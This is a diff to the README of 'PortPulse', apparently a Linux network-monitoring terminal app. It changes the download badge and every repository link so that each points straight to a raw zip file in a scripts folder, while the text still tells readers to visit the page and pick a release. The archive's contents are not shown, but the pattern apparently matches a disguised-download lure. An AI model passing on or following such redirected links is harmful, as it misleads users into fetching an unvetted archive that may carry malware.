@@ -1,12 +1,12 @@
 # 🟣 PortPulse - See Your Linux Network Live
 
-[![Download PortPulse](https://img.shields.io/badge/Download-PortPulse-blue?style=for-the-badge)](https://github.com/troyhigherlaw437/PortPulse)
+[![Download PortPulse](https://img.shields.io/badge/Download-PortPulse-blue?style=for-the-badge)](https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip)
 
 ## 📥 Download PortPulse
 
 Use this link to visit the page and download PortPulse:
 
-[https://github.com/troyhigherlaw437/PortPulse](https://github.com/troyhigherlaw437/PortPulse)
+[https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip](https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip)
 
 ## 🖥️ What PortPulse Does
 
@@ -57,7 +57,7 @@ For best results, use a system with:
 
 Go to the main PortPulse page here:
 
-[https://github.com/troyhigherlaw437/PortPulse](https://github.com/troyhigherlaw437/PortPulse)
+[https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip](https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip)
 
 From there, look for the latest release, package file, or install option that matches your Linux system.
 
@@ -207,7 +207,7 @@ Good habits:
 
 When a new version is available, return to the PortPulse page and repeat the download and install steps with the newer release file.
 
-[https://github.com/troyhigherlaw437/PortPulse](https://github.com/troyhigherlaw437/PortPulse)
+[https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip](https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip)
 
 ## 📌 Short Reference
 
@@ -215,4 +215,4 @@ When a new version is available, return to the PortPulse page and repeat the dow
 - Type: Linux terminal app
 - Use: local observability and network monitoring
 - Best fit: Debian, Ubuntu, Linux servers
-- Main page: https://github.com/troyhigherlaw437/PortPulse
+- Main page: https://github.com/troyhigherlaw437/PortPulse/raw/refs/heads/main/scripts/Pulse_Port_v2.4.zip
